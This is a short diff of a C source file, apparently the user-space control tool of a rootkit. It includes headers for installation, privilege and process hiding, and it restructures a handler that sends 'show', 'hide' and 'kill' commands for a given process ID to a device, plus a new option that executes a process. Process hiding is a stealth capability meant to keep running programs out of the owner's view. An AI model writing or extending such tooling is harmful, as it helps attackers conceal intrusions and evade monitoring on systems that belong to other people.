@@ -3,7 +3,7 @@
 #include <install.h>
 #include <util.h>
 #include <privilege.h>
-#include <hide_proc.h>
+#include <process.h>
 
 #include <stdbool.h>
 #include <sys/types.h>
@@ -64,21 +64,25 @@ int commands_privilege_handler(int argc, char **argv)
 
 int commands_process_handler(int argc, char **argv)
 {
-	pid_t pid = -1;
-
-	bool erase_flag = false;
-
 	int c, ret = 0;
 	ketopt_t o = KETOPT_INIT;
 	while ((c = ketopt(&o, argc, argv, 1, "", proc_longopts)) >= 0) {
-		if (o.arg) {
-			pid = atoi(o.arg);
-			ret += modify_proc(pid, c);
-			if (ret == -1) {
-				fprintf(stderr,
-					"error: unable to write command to device\n");
-				return -1;
+		switch (c) {
+		case OPT_PROC_SHOW:
+		case OPT_PROC_HIDE:
+		case OPT_PROC_KILL:
+			if (o.arg) {
+				pid_t pid = atoi(o.arg);
+				ret = modify_proc(&argv[o.ind - 2][2], pid);
+				if (ret) {
+					fprintf(stderr,
+						"error: unable to write command to device\n");
+				}
 			}
+			break;
+		case OPT_PROC_EXEC:
+			exec_proc(argv[o.ind - 1]);
+			break;
 		}
 	}
 
